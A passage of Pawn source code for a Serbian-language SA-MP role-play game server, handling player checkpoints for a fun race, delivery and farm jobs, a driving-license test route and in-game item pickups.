				Novi_SetPlayerCheckpoint(playerid, -2439.3296,-1788.2076,413.1150, 5.0);
				FunRaceCP{playerid} = 41;
				return 1;
			}
			case 41:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, -2442.7166,-1721.4694,432.2596, 5.0);
				FunRaceCP{playerid} = 42;
				return 1;
			}
			case 42:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, -2326.1667,-1811.7697,436.2458, 5.0);
				FunRaceCP{playerid} = 43;
				return 1;
			}
			case 43:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, -2282.5212,-1742.6521,463.0277, 5.0);
				FunRaceCP{playerid} = 44;
				return 1;
			}
			case 44:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, -2288.9507,-1699.7200,478.6917, 5.0);
				FunRaceCP{playerid} = 45;
				return 1;
			}
			case 45:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, -2308.3101,-1649.5490,483.3065, 5.0);
				FunRaceCP{playerid} = 46;
				return 1;
			}
			case 46:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_DestroyVehicle(FunRaceVoziloOff[playerid]);
				Novi_SetPlayerCheckpoint(playerid, -2252.0894,-1714.0844,480.0311, 5.0);
				FunRaceCP{playerid} = 47;
			}
			case 47:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				Novi_SetPlayerCheckpoint(playerid, -1937.4381,-1925.7428,81.2648, 5.0);
				FunRaceCP{playerid} = 48;
				GiveWeaponToPlayer(playerid, 46, 1);
				FunRaceMessage(playerid, "Sada skoci sa padobranom!");
			}
			case 48:
			{
			    Novi_DisablePlayerCheckpoint(playerid);
				if(ZauzetoMesto1 == 0)
				{
					va_SendClientMessageToAll(-1, "[FunRace]Igrac %s je zauzeo prvo mesto!", ImeIgraca(playerid));
					DajIgracuNovac(playerid, 15000);
					ZauzetoMesto1 = 1;
					return 1;
				}
				else if(ZauzetoMesto2 == 0)
				{
					va_SendClientMessageToAll(-1, "[FunRace]Igrac %s je zauzeo drugo mesto!", ImeIgraca(playerid));
					DajIgracuNovac(playerid, 10000);
					ZauzetoMesto2 = 1;
					return 1;
				}
				else if(ZauzetoMesto3 == 0)
				{
					va_SendClientMessageToAll(-1, "[FunRace]Igrac %s je zauzeo trece mesto!", ImeIgraca(playerid));
					DajIgracuNovac(playerid, 5000);
					ZauzetoMesto2 = 0;
					ZauzetoMesto1 = 0;
					foreach(new i : Player)
					{
						if(FunRace{i} == true)
						{
							FunRaceMessage(i, "FunRace se zavrsio, cestitke pobednicima!");
							FunRacePokrenut = 0;
							FunRacePocinje = false;
							FunRaceCP{i} = 0;
							SetPlayerVirtualWorld(i, 0);
							SpawnPlayer(i);
						}
					}
				}
			}
		}
	}

    if( CheckpointStatus[ playerid ] != 0 ) {
		switch( CheckpointStatus[ playerid ] ) {
		    case 1:
		    {
		        PlayerPlaySound( playerid, 1058, 0.0, 0.0, 0.0);
				Novi_DisablePlayerCheckpoint( playerid );
				SetPVarInt( playerid, "LocatingCar", 0);
				CheckpointStatus[ playerid ] = 0;
				GameTextForPlayer( playerid, "~r~gps ugasen", 5000, 1);
			}
			case 2:
			{
				PlayerPlaySound( playerid, 1058, 0.0, 0.0, 0.0);
				Novi_DisablePlayerCheckpoint( playerid );
				SetPVarInt( playerid, "LocatingPark", 0);
				CheckpointStatus[ playerid ] = 0;
				GameTextForPlayer( playerid, "~r~gps ugasen", 5000, 1);
			}
			case 3: {
			    if( GetPlayerState( playerid ) == PLAYER_STATE_DRIVER && IsPlayerInAnyVehicle( playerid ) && GetVehicleModel( GetPlayerVehicleID( playerid ) ) == 578 && WOOD[ GetPlayerVehicleID( playerid ) ] == true ) {
			        new Float:rot;
					GetVehicleZAngle( GetPlayerVehicleID( playerid ), rot );
					if( rot > 200 && rot < 250 ) {
					    new time = gettime( );
				        new ostatak = ( NovoVreme[ playerid ] - ( time - StaroVreme[ playerid ] ) );
				        if( ( time - StaroVreme[ playerid ] ) < NovoVreme[ playerid ] ) {
					    	SendErrorMessage( playerid, "Dosli ste ranije na marker nego sto je predvidjeno. " );
					    	SendErrorMessage( playerid, "Sacekajte jos %d sekundi i udjite ponovo u marker.", ostatak );
					    	format( globalstring, sizeof( globalstring ), "| V:AC | %s[ID: %d] je stigao na marker pre vremena( za %d od %d sekundi ).", ImeIgraca( playerid ), playerid, (NovoVreme[ playerid ]-ostatak), NovoVreme[ playerid ] );
			        		AdminPoruka( ANTICHEAT, globalstring );
							return 1;
					    }
				    
					    Novi_DisablePlayerCheckpoint( playerid );
					    GameTextForPlayer( playerid, "~w~Pricekajte drvece se istovaruje..", 5000, 1);
					    TogglePlayerControllable( playerid, false );
					    CheckpointStatus[ playerid ] = 0;
						DestroyDynamicObject( WOODObject[ GetPlayerVehicleID( playerid ) ] );
						WOODObject[ GetPlayerVehicleID( playerid ) ] = CreateDynamicObject( 18609, -1966.6454, -2436.1814, 32.0000, 0, 0, 50.0000 );
					    MoveDynamicObject( WOODObject[ GetPlayerVehicleID( playerid ) ], -1972.1990, -2430.8147, 32.0000, 2.00 );
					    SetTimerEx( "Istovar", 5000, false, "dii", playerid, GetPlayerVehicleID( playerid ), 1 );
					}
				}
			}
			case 4: {
			    if( GetPlayerState( playerid ) == PLAYER_STATE_DRIVER && IsPlayerInAnyVehicle( playerid ) && GetVehicleModel( GetPlayerVehicleID( playerid ) ) == 455 && sljunak[ GetPlayerVehicleID( playerid ) ] == true ) {
                    new time = gettime( );
				    new ostatak = ( NovoVreme[ playerid ] - ( time - StaroVreme[ playerid ] ) );
				    if( ( time - StaroVreme[ playerid ] ) < NovoVreme[ playerid ] ) {
					   	SendErrorMessage( playerid, "Dosli ste ranije na marker nego sto je predvidjeno. " );
					   	SendErrorMessage( playerid, "Sacekajte jos %d sekundi i udjite ponovo u marker.", ostatak );
					   	format( globalstring, sizeof( globalstring ), "| V:AC | %s[ID: %d] je stigao na marker pre vremena( za %d od %d sekundi ).", ImeIgraca( playerid ), playerid, (NovoVreme[ playerid ]-ostatak), NovoVreme[ playerid ] );
			        	AdminPoruka( ANTICHEAT, globalstring );
						return 1;
				    }
					    
					Novi_DisablePlayerCheckpoint( playerid );
				    GameTextForPlayer( playerid, "~w~Pricekajte sljunak se istovaruje..", 5000, 1);
				    TogglePlayerControllable( playerid, false );
				    CheckpointStatus[ playerid ] = 0;
				    SetTimerEx( "Istovar", 5000, false, "dii", playerid, GetPlayerVehicleID( playerid ), 2 );
			    }
			}
			case 5: {
			    if( GetPlayerState( playerid ) == PLAYER_STATE_DRIVER && IsPlayerInAnyVehicle( playerid ) && GetVehicleModel( GetPlayerVehicleID( playerid ) ) == 515 && IsTrailerAttachedToVehicle( GetPlayerVehicleID( playerid ) ) && GetVehicleModel( GetVehicleTrailer( GetPlayerVehicleID( playerid ) ) ) == 584)
			    {
			        new time = gettime( );
				    new ostatak = ( NovoVreme[ playerid ] - ( time - StaroVreme[ playerid ] ) );
				    if( ( time - StaroVreme[ playerid ] ) < NovoVreme[ playerid ] ) {
					   	SendErrorMessage( playerid, "Dosli ste ranije na marker nego sto je predvidjeno. " );
					   	SendErrorMessage( playerid, "Sacekajte jos %d sekundi i udjite ponovo u marker.", ostatak );
					   	format( globalstring, sizeof( globalstring ), "| V:AC | %s[ID: %d] je stigao na marker pre vremena( za %d od %d sekundi ).", ImeIgraca( playerid ), playerid, (NovoVreme[ playerid ]-ostatak), NovoVreme[ playerid ] );
			        	AdminPoruka( ANTICHEAT, globalstring );
						return 1;
				    }
				    Novi_DisablePlayerCheckpoint( playerid );
				    GameTextForPlayer( playerid, "~w~Pricekajte gorivo se istovaruje..", 5000, 1);
				    TogglePlayerControllable( playerid, false );
				    CheckpointStatus[ playerid ] = 0;
				    SetTimerEx( "Istovar", 5000, false, "dii", playerid, GetPlayerVehicleID( playerid ), 3 );
			    }
			}
			case 6: {
			
			    if( GetPlayerState( playerid ) == PLAYER_STATE_DRIVER && IsPlayerInAnyVehicle( playerid ) && GetVehicleModel( GetPlayerVehicleID( playerid ) ) == 515 && IsTrailerAttachedToVehicle( GetPlayerVehicleID( playerid ) ) && GetVehicleModel( GetVehicleTrailer( GetPlayerVehicleID( playerid ) ) ) == 584 ) {

				    new time = gettime( );
				    new ostatak = ( NovoVreme[ playerid ] - ( time - StaroVreme[ playerid ] ) );
				    if( ( time - StaroVreme[ playerid ] ) < NovoVreme[ playerid ] ) {
					   	SendErrorMessage( playerid, "Dosli ste ranije na marker nego sto je predvidjeno. " );
					   	SendErrorMessage( playerid, "Sacekajte jos %d sekundi i udjite ponovo u marker.", ostatak );
					   	format( globalstring, sizeof( globalstring ), "| V:AC | %s[ID: %d] je stigao na marker pre vremena( za %d od %d sekundi ).", ImeIgraca( playerid ), playerid, (NovoVreme[ playerid ]-ostatak), NovoVreme[ playerid ] );
			        	AdminPoruka( ANTICHEAT, globalstring );
						return 1;
				    }
				    
				    Novi_DisablePlayerCheckpoint( playerid );
				    GameTextForPlayer( playerid, "~w~Pricekajte gorivo se istovaruje..", 5000, 1);
				    TogglePlayerControllable( playerid, false );
				    CheckpointStatus[ playerid ] = 0;
				    SetTimerEx( "Istovar", 5000, false, "dii", playerid, GetPlayerVehicleID( playerid ), 4 );
			    }
			}
			case 7: {
			    if( GetPlayerState( playerid ) == PLAYER_STATE_DRIVER && IsPlayerInAnyVehicle( playerid ) && GetVehicleModel( GetPlayerVehicleID( playerid ) ) == 515 && IsTrailerAttachedToVehicle( GetPlayerVehicleID( playerid ) ) && GetVehicleModel( GetVehicleTrailer( GetPlayerVehicleID( playerid ) ) ) == 584 ) {

				    new time = gettime( );
				    new ostatak = ( NovoVreme[ playerid ] - ( time - StaroVreme[ playerid ] ) );
				    if( ( time - StaroVreme[ playerid ] ) < NovoVreme[ playerid ] ) {
					   	SendErrorMessage( playerid, "Dosli ste ranije na marker nego sto je predvidjeno. " );
					   	SendErrorMessage( playerid, "Sacekajte jos %d sekundi i udjite ponovo u marker.", ostatak );
					   	format( globalstring, sizeof( globalstring ), "| V:AC | %s[ID: %d] je stigao na marker pre vremena( za %d od %d sekundi ).", ImeIgraca( playerid ), playerid, (NovoVreme[ playerid ]-ostatak), NovoVreme[ playerid ] );
			        	AdminPoruka( ANTICHEAT, globalstring );
						return 1;
				    }
				    
				    Novi_DisablePlayerCheckpoint( playerid );
				    GameTextForPlayer( playerid, "~w~Pricekajte gorivo se istovaruje..", 5000, 1);
				    TogglePlayerControllable( playerid, false );
				    CheckpointStatus[ playerid ] = 0;
				    SetTimerEx( "Istovar", 5000, false, "dii", playerid, GetPlayerVehicleID( playerid ), 5 );
			    }
			}
			case 8: {
			    if( GetPlayerState( playerid ) == PLAYER_STATE_DRIVER && IsPlayerInAnyVehicle( playerid ) && GetVehicleModel( GetPlayerVehicleID( playerid ) ) == 515 && IsTrailerAttachedToVehicle( GetPlayerVehicleID( playerid ) ) && GetVehicleModel( GetVehicleTrailer( GetPlayerVehicleID( playerid ) ) ) == 584 ) {

				    new time = gettime( );
				    new ostatak = ( NovoVreme[ playerid ] - ( time - StaroVreme[ playerid ] ) );
				    if( ( time - StaroVreme[ playerid ] ) < NovoVreme[ playerid ] ) {
					   	SendErrorMessage( playerid, "Dosli ste ranije na marker nego sto je predvidjeno. " );
					   	SendErrorMessage( playerid, "Sacekajte jos %d sekundi i udjite ponovo u marker.", ostatak );
					   	format( globalstring, sizeof( globalstring ), "| V:AC | %s[ID: %d] je stigao na marker pre vremena( za %d od %d sekundi ).", ImeIgraca( playerid ), playerid, (NovoVreme[ playerid ]-ostatak), NovoVreme[ playerid ] );
			        	AdminPoruka( ANTICHEAT, globalstring );
						return 1;
				    }

				    Novi_DisablePlayerCheckpoint( playerid );
				    GameTextForPlayer( playerid, "~w~Pricekajte gorivo se istovaruje..", 5000, 1);
				    TogglePlayerControllable( playerid, false );
				    CheckpointStatus[ playerid ] = 0;
				    SetTimerEx( "Istovar", 5000, false, "dii", playerid, GetPlayerVehicleID( playerid ), 6 );
			    }
			}
			
			case 11: {
			
			    if( IsPlayerInAnyVehicle( playerid ) ) {
			    
					if( VrstaIlegala[ playerid ] == 1 ) {
					    if( PlayerInfo[ playerid ][ xNovac ] < KolicinaIlegala[ playerid ]*2) return SendErrorMessage( playerid, "Nemate dovoljno novca!Jedan gram kosta 2$");
					    DajIgracuNovac( playerid, -KolicinaIlegala[ playerid ]*2) ;
					    Novi_DisablePlayerCheckpoint( playerid );
					    CheckpointStatus[ playerid ] = 0;
						PlayerInfo[ playerid ][ xOpium ] += KolicinaIlegala[ playerid ];
						SendClientMessageEx( playerid, SRVBOJA1, "Pokupio si %d grama opiuma.", KolicinaIlegala[ playerid ] );
						KolicinaIlegala[ playerid ] = 0; VrstaIlegala[ playerid ] = 0;
					}
					else if( VrstaIlegala[ playerid ] == 2 ) {
					
					    if( PlayerInfo[ playerid ][ xNovac ] < KolicinaIlegala[ playerid ]*3) return SendErrorMessage( playerid, "Nemate dovoljno novca!Jedan gram kosta 3$");
					    DajIgracuNovac( playerid, -KolicinaIlegala[ playerid ]*3) ;
					    Novi_DisablePlayerCheckpoint( playerid );
					    CheckpointStatus[ playerid ] = 0;
					    PlayerInfo[ playerid ][ xMetilAmin ] += KolicinaIlegala[ playerid ];
						SendClientMessageEx( playerid, SRVBOJA1, "Pokupio si %d grama Methylamina.", KolicinaIlegala[ playerid ] );
	                    KolicinaIlegala[ playerid ] = 0; VrstaIlegala[ playerid ] = 0;
					}
					else {
					    SendErrorMessage( playerid, "Nisi narucio robu. ");
					    return 1;
					}
				}
				else {
					SCM( playerid, CRVENA, "Moras biti u autu. ");
					return 1;
				}
			}
			case 12: {
			
			    Novi_DisablePlayerCheckpoint( playerid );
				SCM( playerid, ZUTA, "Kada klijent sedne u vozilo ukucajte '/taxi ponudivoznju' da mu ponudite voznju.");
				CheckpointStatus[ playerid ] = 0;
			}
			case 13: {
			    if( Polaganje[ playerid ] >= 1 && GetVehicleModel( GetPlayerVehicleID( playerid ) ) == 410 && GetPlayerState( playerid ) == 2 ) {
                    Novi_DisablePlayerCheckpoint( playerid );
					switch( Polaganje[ playerid ] ) {
			            case 1: {
			                Polaganje[ playerid ] = 2;
			                Novi_SetPlayerCheckpoint( playerid, 1320.6283, -1855.5220, 13.0350, 5.0 );
			                SCM( playerid, -1, ""col_orange"[Instruktor]: "col_white"Nastavi dalje(marker)." );
			            }
			            case 2: {
			                Polaganje[ playerid ] = 3;
			                Novi_SetPlayerCheckpoint( playerid, 1407.0656, -1874.0571, 13.0385, 5.0 );
			                SCM( playerid, -1, ""col_orange"[Instruktor]: "col_white"Nastavi dalje(marker)." );
			            }
			            case 3: {
			                Polaganje[ playerid ] = 4;
			                Novi_SetPlayerCheckpoint( playerid, 1483.3596, -1874.2791, 13.0370, 5.0 );
			                SCM( playerid, -1, ""col_orange"[Instruktor]: "col_white"Nastavi dalje(marker)." );
			            }
			            case 4: {
			                Polaganje[ playerid ] = 5;
			                Novi_SetPlayerCheckpoint( playerid, 1570.6552, -1873.7633, 13.0371, 5.0 );
			                SCM( playerid, -1, ""col_orange"[Instruktor]: "col_white"Nastavi dalje(marker)." );
			            }
			            case 5: {
			                Polaganje[ playerid ] = 6;
			                Novi_SetPlayerCheckpoint( playerid, 1653.2950, -1874.3029, 13.0370, 5.0 );
			                SCM( playerid, -1, ""col_orange"[Instruktor]: "col_white"Nastavi dalje(marker)." );
			            }
			            case 6: {
			                Polaganje[ playerid ] = 7;
			                Novi_SetPlayerCheckpoint( playerid, 1689.6855, -1853.0991, 13.0325, 5.0 );
			                SCM( playerid, -1, ""col_orange"[Instruktor]: "col_white"Nastavi dalje(marker)." );
			            }
			            case 7: {
			                Polaganje[ playerid ] = 8;
			                Novi_SetPlayerCheckpoint( playerid, 1691.2537, -1820.7423, 13.0342, 5.0 );
			                SCM( playerid, -1, ""col_orange"[Instruktor]: "col_white"Nastavi dalje(marker)." );
			            }
			            case 8: {
			                Polaganje[ playerid ] = 9;
			                Novi_SetPlayerCheckpoint( playerid, 1756.4960, -1825.2556, 13.0334, 5.0 );
			                SCM( playerid, -1, ""col_orange"[Instruktor]: "col_white"Nastavi dalje(marker)." );
			            }
			            case 9: {
			                Polaganje[ playerid ] = 10;
			                Novi_SetPlayerCheckpoint( playerid, 1806.2850, -1834.4004, 13.0371, 5.0 );
			                SCM( playerid, -1, ""col_orange"[Instruktor]: "col_white"Nastavi dalje(marker)." );
			            }
			            case 10: {
			                Polaganje[ playerid ] = 11;
			                Novi_SetPlayerCheckpoint( playerid, 1824.4093, -1798.5709, 13.0390, 5.0 );
			                SCM( playerid, -1, ""col_orange"[Instruktor]: "col_white"Nastavi dalje(marker)." );
			            }
			            case 11: {
			                Polaganje[ playerid ] = 12;
			                Novi_SetPlayerCheckpoint( playerid, 1823.4205, -1765.2046, 13.0345, 5.0 );
			                SCM( playerid, -1, ""col_orange"[Instruktor]: "col_white"Nastavi dalje(marker)." );
			            }
			            case 12: {
			                Polaganje[ playerid ] = 13;
			                Novi_SetPlayerCheckpoint( playerid, 1850.7224, -1754.7550, 13.0348, 5.0 );
			                SCM( playerid, -1, ""col_orange"[Instruktor]: "col_white"Nastavi dalje(marker)." );
			            }
			            case 13: {
			                Polaganje[ playerid ] = 14;
			                Novi_SetPlayerCheckpoint( playerid, 1998.4990, -1755.0909, 13.0348, 5.0 );
			                SCM( playerid, -1, ""col_orange"[Instruktor]: "col_white"Nastavi dalje(marker)." );
			            }
			            case 14: {
			                Polaganje[ playerid ] = 15;
			                Novi_SetPlayerCheckpoint( playerid, 2083.9297, -1739.3367, 13.0325, 5.0 );
			                SCM( playerid, -1, ""col_orange"[Instruktor]: "col_white"Nastavi dalje(marker)." );
			            }
			            case 15: {
			                Polaganje[ playerid ] = 16;
			                Novi_SetPlayerCheckpoint( playerid, 2083.3044, -1644.4675, 13.0436, 5.0 );
			                SCM( playerid, -1, ""col_orange"[Instruktor]: "col_white"Nastavi dalje(marker)." );
			            }
			            case 16: {
			                Polaganje[ playerid ] = 17;
			                Novi_SetPlayerCheckpoint( playerid, 2092.3054, -1602.7681, 13.0241, 5.0 );
			                SCM( playerid, -1, ""col_orange"[Instruktor]: "col_white"Sada levo(prati marker)." );
			            }
			            case 17: {
			                Polaganje[ playerid ] = 18;
			                Novi_SetPlayerCheckpoint( playerid, 2094.0664, -1560.8754, 12.7802, 5.0 );
			                SCM( playerid, -1, ""col_orange"[Instruktor]: "col_white"Stigli smo na poligon , nastavi pravo(prati marker)." );
			            }
			            case 18: {
			                Polaganje[ playerid ] = 19;
			                Novi_SetPlayerCheckpoint( playerid, 2084.4260, -1556.8856, 13.2021, 5.0 );
			                SCM( playerid, -1, ""col_orange"[Instruktor]: "col_white"Sada levo(prati marker)." );
			            }
			            case 19: {
			                Polaganje[ playerid ] = 20;
			                Novi_SetPlayerCheckpoint( playerid, 2060.9619, -1557.3344, 13.2084, 5.0 );
			                SCM( playerid, -1, ""col_orange"[Instruktor]: "col_white"Sada pravo(prati marker)." );
			            }
			            case 20: {
			                Polaganje[ playerid ] = 21;
			                Novi_SetPlayerCheckpoint( playerid, 2060.8792, -1588.1157, 13.2077, 5.0 );
			                SCM( playerid, -1, ""col_orange"[Instruktor]: "col_white"Idi pravo, menjaj brzine prvu drugu i zaustavi se u obelezenom polju(marker)." );
			            }
			            case 21: {
			                Polaganje[ playerid ] = 22;
			                Novi_SetPlayerCheckpoint( playerid, 2063.6025, -1599.0088, 13.2097, 5.0 );
			                SCM( playerid, -1, ""col_orange"[Instruktor]: "col_white"Bravo sad idi na polukruzno okretanje(marker)." );
			            }
			            case 22: {
			                Polaganje[ playerid ] = 23;
			                Novi_SetPlayerCheckpoint( playerid, 2083.1077, -1593.8938, 13.2103, 5.0 );
			                SCM( playerid, -1, ""col_orange"[Instruktor]: "col_white"Sada kreni sa motanjem volana pun ulevo(marker)." );
			            }
			            case 23: {
			                Polaganje[ playerid ] = 24;
			                Novi_SetPlayerCheckpoint( playerid, 2084.8271, -1598.9829, 13.2046, 5.0 );
			                SCM( playerid, -1, ""col_orange"[Instruktor]: "col_white"Sada motaj pun desno i u rikverc(marker)." );
			            }
			            case 24: {
			                Polaganje[ playerid ] = 25;
			                Novi_SetPlayerCheckpoint( playerid, 2065.8367, -1595.8187, 13.2068, 5.0 );
			                SCM( playerid, -1, ""col_orange"[Instruktor]: "col_white"Sad stani pored razdelne linije(marker)." );
			            }
			            case 25: {
			                Polaganje[ playerid ] = 26;
			                Novi_SetPlayerCheckpoint( playerid, 2075.6956, -1584.7889, 13.2054, 5.0 );
			                SCM( playerid, -1, ""col_orange"[Instruktor]: "col_white"Izvrsi garaziranje u oznacenom polju(marker)." );
			            }
			            case 26: {
			                Polaganje[ playerid ] = 27;
			                Novi_SetPlayerCheckpoint( playerid, 2062.0688, -1588.8665, 13.2090, 5.0 );
			                SCM( playerid, -1, ""col_orange"[Instruktor]: "col_white"Bravo, prosao si poligon , sada ide gradska voznja , idi ka izlazu(marker)." );
			            }
			            case 27: {
			                Polaganje[ playerid ] = 28;
			                Novi_SetPlayerCheckpoint( playerid, 2092.6572, -1599.9106, 13.0132, 5.0 );
			                SCM( playerid, -1, ""col_orange"[Instruktor]: "col_white"Idi ka izlazu(marker)." );
			            }
			            case 28: {
			                Polaganje[ playerid ] = 29;
			                Novi_SetPlayerCheckpoint( playerid, 2079.7361, -1609.8646, 13.0318, 5.0 );
			                SCM( playerid, -1, ""col_orange"[Instruktor]: "col_white"Nastavi dalje(marker)." );
			            }
			            case 29: {
			                Polaganje[ playerid ] = 30;
			                Novi_SetPlayerCheckpoint( playerid, 2021.3589, -1609.9657, 13.0368, 5.0 );
			                SCM( playerid, -1, ""col_orange"[Instruktor]: "col_white"Nastavi dalje(marker)." );
			            }
			            case 30: {
			                Polaganje[ playerid ] = 31;
			                Novi_SetPlayerCheckpoint( playerid, 2000.1221, -1665.6876, 13.0373, 5.0 );
			                SCM( playerid, -1, ""col_orange"[Instruktor]: "col_white"Nastavi dalje(marker)." );
			            }
			            case 31: {
			                Polaganje[ playerid ] = 32;
			                Novi_SetPlayerCheckpoint( playerid, 1999.3276, -1736.3296, 13.0343, 5.0 );
			                SCM( playerid, -1, ""col_orange"[Instruktor]: "col_white"Nastavi dalje(marker)." );
			            }
			            case 32: {
			                Polaganje[ playerid ] = 33;
			                Novi_SetPlayerCheckpoint( playerid, 1952.2925, -1749.8804, 13.0353, 5.0 );
			                SCM( playerid, -1, ""col_orange"[Instruktor]: "col_white"Nastavi dalje(marker)." );
			            }
			            case 33: {
			                Polaganje[ playerid ] = 34;
			                Novi_SetPlayerCheckpoint( playerid, 1840.9231, -1749.6860, 13.0346, 5.0 );
			                SCM( playerid, -1, ""col_orange"[Instruktor]: "col_white"Nastavi dalje(marker)." );
			            }
			            case 34: {
			                Polaganje[ playerid ] = 35;
			                Novi_SetPlayerCheckpoint( playerid, 1819.1608, -1766.7782, 13.0326, 5.0 );
			                SCM( playerid, -1, ""col_orange"[Instruktor]: "col_white"Nastavi dalje(marker)." );
			            }
			            case 35: {
			                Polaganje[ playerid ] = 36;
			                Novi_SetPlayerCheckpoint( playerid, 1809.0933, -1829.5872, 13.0381, 5.0 );
			                SCM( playerid, -1, ""col_orange"[Instruktor]: "col_white"Nastavi dalje(marker)." );
			            }
			            case 36: {
			                Polaganje[ playerid ] = 37;
			                Novi_SetPlayerCheckpoint( playerid, 1706.1729, -1810.6217, 13.0162, 5.0 );
			                SCM( playerid, -1, ""col_orange"[Instruktor]: "col_white"Nastavi dalje(marker)." );
			            }
			            case 37: {
			                Polaganje[ playerid ] = 38;
			                Novi_SetPlayerCheckpoint( playerid, 1688.0972, -1831.3156, 13.0353, 5.0 );
			                SCM( playerid, -1, ""col_orange"[Instruktor]: "col_white"Nastavi dalje(marker)." );
			            }
			            case 38: {
			                Polaganje[ playerid ] = 39;
			                Novi_SetPlayerCheckpoint( playerid, 1607.4672, -1869.7839, 13.0362, 5.0 );
			                SCM( playerid, -1, ""col_orange"[Instruktor]: "col_white"Nastavi dalje(marker)." );
			            }
			            case 39: {
			                Polaganje[ playerid ] = 40;
			                Novi_SetPlayerCheckpoint( playerid, 1521.2484, -1870.2684, 13.0370, 5.0 );
			                SCM( playerid, -1, ""col_orange"[Instruktor]: "col_white"Nastavi dalje(marker)." );
			            }
			            case 40: {
			                Polaganje[ playerid ] = 41;
			                Novi_SetPlayerCheckpoint( playerid, 1409.2546, -1870.6511, 13.0369, 5.0 );
			                SCM( playerid, -1, ""col_orange"[Instruktor]: "col_white"Nastavi dalje(marker)." );
			            }
			            case 41: {
			                Polaganje[ playerid ] = 42;
			                Novi_SetPlayerCheckpoint( playerid, 1299.3842, -1850.4553, 13.0380, 5.0 );
			                SCM( playerid, -1, ""col_orange"[Instruktor]: "col_white"Nastavi dalje(marker)." );
			            }
			            case 42: {
			                Polaganje[ playerid ] = 43;
			                Novi_SetPlayerCheckpoint( playerid, 1267.9080, -1836.6311, 13.0364, 5.0 );
			                SCM( playerid, -1, ""col_orange"[Instruktor]: "col_white"Nastavi dalje(marker)." );
			            }
			            case 43: {
			                Polaganje[ playerid ] = 0;
			                SetVehicleToRespawn( GetPlayerVehicleID( playerid ) );
			                new Float:HP; GetVehicleHealth( GetPlayerVehicleID( playerid ), HP );
		    				if( HP < 950.0 ) {
		    				    SCM( playerid, -1, ""col_orange"[Instruktor]: "col_white"Pali ste test voznje jer ste ostetili vozilo." );
								return 1;
		    				}
		    				PlayerInfo[ playerid ][ xVozacka ] = 1;
							SavePlayer( playerid );
							SCM( playerid, -1, ""col_orange"[Instruktor]: "col_white"Prosli ste test voznje i dobili B kategoriju." );
			            }
					}
			    }
			}
			
			case 15: {
			
			    Novi_DisablePlayerCheckpoint( playerid );
				SCM( playerid, ZUTA, "Stigli ste na lokaciju.");
				CheckpointStatus[ playerid ] = 0;
			}
			case 16: {
				if( farmerInfo[ playerid ][ fiHaveBucket ] ) {
				    if( farmerInfo[ playerid ][ fiCowNumber ] < 14 ) {
					    new id = farmerInfo[ playerid ][ fiCowNumber ];
					    RemovePlayerAttachedObject( playerid, OBJECT_NOSI );
					    Novi_DisablePlayerCheckpoint( playerid );
					    CheckpointStatus[ playerid ] = 0;
					    TogglePlayerControllable( playerid, false );
					    farmerInfo[ playerid ][ fiBucketObject ] = CreatePlayerObject( playerid, 2613, milkInfo[ id ][ obPos ][ 0 ], milkInfo[ id ][ obPos ][ 1 ], milkInfo[ id ][ obPos ][ 2 ], 0.0, 0.0, 0.0 );
						SetTimerEx( "FarmerCows", 5000, false, "di", playerid, (id+1) );
						ApplyAnimation( playerid, "BOMBER", "BOM_Plant_Loop", 4.0, 1, 0, 0, 0, 0 );
					}
					else if( farmerInfo[ playerid ][ fiCowNumber ] == 14 ) {
					    SendJobMessage( playerid, "Zavrsili ste sa krava, odnesite mleko u kamionet." );
					    SendJobMessage( playerid, "Mleko u kamionet ubacujete 'LEVIM KLIKOM MISA'." );
					}
				}
			}
			case 17: {
			    if( GetVehicleModel( GetPlayerVehicleID( playerid ) ) == 478 ) {
					if( farmerVehicles[ GetPlayerVehicleID( playerid ) ][ fvMilk ] == true ) {
	
	                    new time = gettime( );
					    new ostatak = ( NovoVreme[ playerid ] - ( time - StaroVreme[ playerid ] ) );
				    	if( ( time - StaroVreme[ playerid ] ) < NovoVreme[ playerid ] ) {
						   	SendErrorMessage( playerid, "Dosli ste ranije na marker nego sto je predvidjeno. " );
						   	SendErrorMessage( playerid, "Sacekajte jos %d sekundi i udjite ponovo u marker.", ostatak );
						   	format( globalstring, sizeof( globalstring ), "| V:AC | %s[ID: %d] je stigao na marker pre vremena( za %d od %d sekundi ).", ImeIgraca( playerid ), playerid, (NovoVreme[ playerid ]-ostatak), NovoVreme[ playerid ] );
				        	AdminPoruka( ANTICHEAT, globalstring );
							return 1;
					    }

						SendJobMessage( playerid, "Stigao si na lokaciju, izadji i izvadi iz kamioneta mleko." );
						SendJobMessage( playerid, "Mleko iz kamioneta vadite 'LEVIM KLIKOM MISA'." );
					}
				}
			}
			case 18: {
			    if( GetFactionType( playerid ) == ORG_TIP_ELEK && GetVehicleModel( GetPlayerVehicleID( playerid ) ) == 552 && ElectricOprema[ playerid ] && IsPlayerInAnyVehicle( playerid ) ) {
			        Novi_DisablePlayerCheckpoint( playerid );
			        electricNACP[ playerid ] = true;
			        SendJobMessage( playerid, "Stigao si na lokaciju, izadji, popni se na banderu i popravi kvar." );
					SendJobMessage( playerid, "Koristi komandu - "col_white"/electric popravi." );
				}
			}
			case 19: {
			    if( !IsPlayerInAnyVehicle( playerid ) && ElectricPosao[ playerid ] == 2 && GetFactionType( playerid ) == ORG_TIP_ELEK && ElectricOprema[ playerid ] ) {
			        Novi_DisablePlayerCheckpoint( playerid );
			        BrojilaKuca[ playerid ]++;
			        SendJobMessage( playerid, "Poceli se sa ocitavanjem brojila, pricekajte "col_white"5s." );
					ApplyAnimation( playerid, "SPRAYCAN", "spraycan_full", 4.0, 0, 0, 0, 5000, 0 );
					SetTimerEx( "BrojiloGotovo", 5000, false, "d", playerid );
				}
			}
			case 22: {
			    Novi_DisablePlayerCheckpoint( playerid );
			    SendJobMessage( playerid, "Stanite do kontejnera i uzmite smece "col_white"'LEVIM KLIKOM MISA'." );
				CheckpointStatus[ playerid ] = 0;
			}
			case 23: {
